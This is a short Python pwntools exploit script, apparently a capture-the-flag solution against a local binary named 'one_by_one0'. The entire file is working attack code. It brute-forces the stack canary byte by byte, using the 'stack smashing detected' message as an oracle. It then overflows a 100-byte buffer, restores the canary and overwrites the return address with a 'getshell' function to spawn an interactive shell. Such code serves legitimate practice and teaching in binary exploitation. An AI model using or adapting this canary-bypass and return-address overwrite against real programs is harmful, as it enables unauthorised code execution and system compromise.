from pwn import *
import time 

#context.log_level = 'debug'
io = process("./one_by_one0")
elf = ELF("./one_by_one0")

canary = b'\x00'

for k in range(3):
	print "Find %d" % k
	for b in range(256):
		#print "Check %d for %d" % (b, k)
		payload = 'A'*100 + canary + p8(b)
		io.sendafter('Hacker!\n', payload)
		time.sleep(0.01)
		res = io.recv()
		if 'stack smashing detected' not in res:
			print 'the %d is %d' % (k, b)
			canary += p8(b)
			io.send('A'*108)
			break 

print 'canary: %s' % hex(u32(canary))

payload = 'A'*100 + canary + 'B'*12 + p32(elf.symbols['getshell'])
io.send(payload)

io.interactive()